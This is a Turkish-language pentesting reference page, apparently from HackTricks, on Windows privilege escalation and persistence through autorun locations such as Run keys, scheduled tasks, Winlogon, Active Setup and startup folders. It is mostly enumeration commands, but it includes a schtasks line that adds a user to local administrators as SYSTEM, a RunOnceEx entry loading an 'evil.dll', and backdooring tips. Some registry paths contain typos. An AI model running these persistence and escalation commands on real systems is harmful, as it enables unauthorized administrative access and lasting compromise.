# Autorun Binaries ile Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic**, **başlangıç**ta programları çalıştırmak için kullanılabilir. Başlangıçta çalışacak şekilde programlanmış olan ikili dosyaları görmek için:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Planlanmış Görevler

**Görevler**, **belirli bir sıklıkla** çalışacak şekilde planlanabilir. Hangi ikili dosyaların çalışacak şekilde planlandığını görmek için:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Klasörler

**Başlangıç klasörlerinde bulunan tüm ikili dosyalar, başlangıçta çalıştırılacaktır.** Yaygın başlangıç klasörleri aşağıda listelenmiştir, ancak başlangıç klasörü kayıt defterinde belirtilmiştir. [Bunu okuyun, nerede olduğunu öğrenin.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Kayıt Defteri

> [!NOTE]
> [Buradan not](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** kayıt defteri girişi, 64-bit bir Windows sürümü çalıştırdığınızı gösterir. İşletim sistemi, bu anahtarı 64-bit Windows sürümlerinde çalışan 32-bit uygulamalar için HKEY_LOCAL_MACHINE\SOFTWARE'ün ayrı bir görünümünü göstermek için kullanır.

### Çalıştırmalar

**Yaygın olarak bilinen** AutoRun kayıt defteri:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** ve **RunOnce** olarak bilinen kayıt defteri anahtarları, bir kullanıcının sisteme her girişinde programları otomatik olarak çalıştırmak için tasarlanmıştır. Bir anahtarın veri değeri olarak atanan komut satırı 260 karakter veya daha az ile sınırlıdır.

**Hizmet çalıştırmaları** (açılış sırasında hizmetlerin otomatik başlatılmasını kontrol edebilir):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista ve sonraki sürümlerde, **Run** ve **RunOnce** kayıt defteri anahtarları otomatik olarak oluşturulmaz. Bu anahtarlardaki girişler ya doğrudan programları başlatabilir ya da bunları bağımlılıklar olarak belirtebilir. Örneğin, bir DLL dosyasını oturum açıldığında yüklemek için, **RunOnceEx** kayıt defteri anahtarını "Depend" anahtarı ile birlikte kullanabilirsiniz. Bu, sistem başlangıcında "C:\temp\evil.dll" dosyasını çalıştırmak için bir kayıt defteri girişi ekleyerek gösterilmektedir:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Exploit 1**: Eğer **HKLM** içindeki belirtilen kayıt defterlerinden birine yazabiliyorsanız, farklı bir kullanıcı oturum açtığında ayrıcalıkları artırabilirsiniz.

> [!NOTE]
> **Exploit 2**: Eğer **HKLM** içindeki herhangi bir kayıt defterinde belirtilen ikili dosyalardan birini üzerine yazabiliyorsanız, farklı bir kullanıcı oturum açtığında o ikili dosyayı bir arka kapı ile değiştirebilir ve ayrıcalıkları artırabilirsiniz.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Başlangıç Yolu

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Başlangıç** klasörüne yerleştirilen kısayollar, kullanıcı oturumu açıldığında veya sistem yeniden başlatıldığında hizmetlerin veya uygulamaların otomatik olarak başlatılmasını tetikler. **Başlangıç** klasörünün konumu, hem **Yerel Makine** hem de **Geçerli Kullanıcı** kapsamları için kayıt defterinde tanımlanmıştır. Bu, belirtilen **Başlangıç** konumlarına eklenen her kısayolun, bağlantılı hizmetin veya programın oturum açma veya yeniden başlatma sürecinin ardından başlatılmasını sağlayacağı anlamına gelir; bu da programların otomatik olarak çalıştırılmasını planlamak için basit bir yöntemdir.

> [!NOTE]
> Eğer **HKLM** altında herhangi bir \[User] Shell Folder'ı geçersiz kılabiliyorsanız, bunu kontrol ettiğiniz bir klasöre yönlendirebilir ve bir arka kapı yerleştirerek, bir kullanıcı sisteme giriş yaptığında bu arka kapının çalıştırılmasını sağlayarak ayrıcalıkları artırabilirsiniz.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Anahtarları

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Genellikle, **Userinit** anahtarı **userinit.exe** olarak ayarlanmıştır. Ancak, bu anahtar değiştirilirse, belirtilen çalıştırılabilir dosya kullanıcı oturumu açıldığında **Winlogon** tarafından da başlatılacaktır. Benzer şekilde, **Shell** anahtarı Windows'un varsayılan shell'i olan **explorer.exe**'ye işaret etmek için tasarlanmıştır.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> Eğer kayıt defteri değerini veya ikili dosyayı yazabilirseniz, yetkileri artırabileceksiniz.

### Politika Ayarları

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Çalıştır** anahtarını kontrol edin.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Güvenli Mod Komut İstemcisini Değiştirme

Windows Kayıt Defteri'nde `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` altında varsayılan olarak **`AlternateShell`** değeri `cmd.exe` olarak ayarlanmıştır. Bu, başlangıçta "Komut İstemcisi ile Güvenli Mod" seçeneğini seçtiğinizde (F8 tuşuna basarak) `cmd.exe`'nin kullanıldığı anlamına gelir. Ancak, bilgisayarınızı F8'e basmadan ve manuel olarak seçmeden bu modda otomatik olarak başlatacak şekilde ayarlamak mümkündür.

"Komut İstemcisi ile Güvenli Mod"da otomatik başlatma için bir önyükleme seçeneği oluşturma adımları:

1. `boot.ini` dosyasının özelliklerini yalnızca okunur, sistem ve gizli bayrakları kaldıracak şekilde değiştirin: `attrib c:\boot.ini -r -s -h`
2. `boot.ini` dosyasını düzenlemek için açın.
3. Aşağıdaki gibi bir satır ekleyin: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` dosyasındaki değişiklikleri kaydedin.
5. Orijinal dosya özelliklerini yeniden uygulayın: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** kayıt defteri anahtarını değiştirmek, yetkisiz erişim için potansiyel olarak özel komut kabuğu kurulumu sağlar.
- **Exploit 2 (PATH Yazma İzinleri):** Sistem **PATH** değişkeninin herhangi bir bölümünde yazma izinlerine sahip olmak, özellikle `C:\Windows\system32`'den önce, özel bir `cmd.exe` çalıştırmanıza olanak tanır; bu, sistem Güvenli Modda başlatıldığında bir arka kapı olabilir.
- **Exploit 3 (PATH ve boot.ini Yazma İzinleri):** `boot.ini`'ye yazma erişimi, otomatik Güvenli Mod başlatmayı sağlar ve bir sonraki yeniden başlatmada yetkisiz erişimi kolaylaştırır.

Mevcut **AlternateShell** ayarını kontrol etmek için bu komutları kullanın:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Yüklenmiş Bileşen

Active Setup, Windows'ta **masaüstü ortamı tamamen yüklenmeden önce başlatılan** bir özelliktir. Kullanıcı oturumu devam etmeden önce tamamlanması gereken belirli komutların yürütülmesine öncelik verir. Bu işlem, Run veya RunOnce kayıt defteri bölümlerindeki diğer başlangıç girişleri tetiklenmeden önce bile gerçekleşir.

Active Setup, aşağıdaki kayıt defteri anahtarları aracılığıyla yönetilmektedir:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Bu anahtarlar içinde, her biri belirli bir bileşene karşılık gelen çeşitli alt anahtarlar bulunmaktadır. Özellikle ilgi çekici anahtar değerleri şunlardır:

- **IsInstalled:**
- `0`, bileşenin komutunun yürütülmeyeceğini gösterir.
- `1`, komutun her kullanıcı için bir kez yürütüleceği anlamına gelir; bu, `IsInstalled` değeri eksikse varsayılan davranıştır.
- **StubPath:** Active Setup tarafından yürütülecek komutu tanımlar. `notepad` gibi geçerli bir komut satırı olabilir.

**Güvenlik İçgörüleri:**

- **`IsInstalled`** değeri `"1"` olarak ayarlanmış bir anahtara belirli bir **`StubPath`** ile yazmak veya değiştirmek, yetkisiz komut yürütülmesine yol açabilir ve bu da ayrıcalık yükseltmesine neden olabilir.
- Herhangi bir **`StubPath`** değerinde referans verilen ikili dosyanın değiştirilmesi de yeterli izinler varsa ayrıcalık yükseltmesine ulaşabilir.

Active Setup bileşenleri arasındaki **`StubPath`** yapılandırmalarını incelemek için bu komutlar kullanılabilir:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Tarayıcı Yardımcı Nesneleri

### Tarayıcı Yardımcı Nesneleri (BHO'lar) Genel Bakış

Tarayıcı Yardımcı Nesneleri (BHO'lar), Microsoft'un Internet Explorer'ına ek özellikler ekleyen DLL modülleridir. Her başlatmada Internet Explorer ve Windows Gezgini'ne yüklenirler. Ancak, **NoExplorer** anahtarını 1 olarak ayarlayarak yürütmeleri engellenebilir, bu da Windows Gezgini örnekleriyle yüklenmelerini önler.

BHO'lar, Windows 10 ile Internet Explorer 11 aracılığıyla uyumludur, ancak daha yeni Windows sürümlerinde varsayılan tarayıcı olan Microsoft Edge'de desteklenmezler.

Bir sistemde kayıtlı BHO'ları keşfetmek için aşağıdaki kayıt defteri anahtarlarını inceleyebilirsiniz:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Her BHO, kayıt defterinde benzersiz bir tanımlayıcı olarak **CLSID** ile temsil edilir. Her CLSID hakkında ayrıntılı bilgi `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` altında bulunabilir.

Kayıt defterinde BHO'ları sorgulamak için bu komutlar kullanılabilir:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Uzantıları

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Kayıt defterinin her bir dll için 1 yeni kayıt içereceğini ve bunun **CLSID** ile temsil edileceğini unutmayın. CLSID bilgilerini `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` içinde bulabilirsiniz.

### Font Sürücüleri

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Açık Komut

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Görüntü Dosyası Çalıştırma Seçenekleri
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Not edin ki, autorun'ları bulabileceğiniz tüm siteler **zaten**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) tarafından **arama yapılmıştır**. Ancak, **otomatik olarak çalıştırılan** dosyaların **daha kapsamlı bir listesi** için Sysinternals'tan [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kullanabilirsiniz:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Daha Fazla

**Kayıt defterleri gibi daha fazla Autorun bulmak için** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Referanslar

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
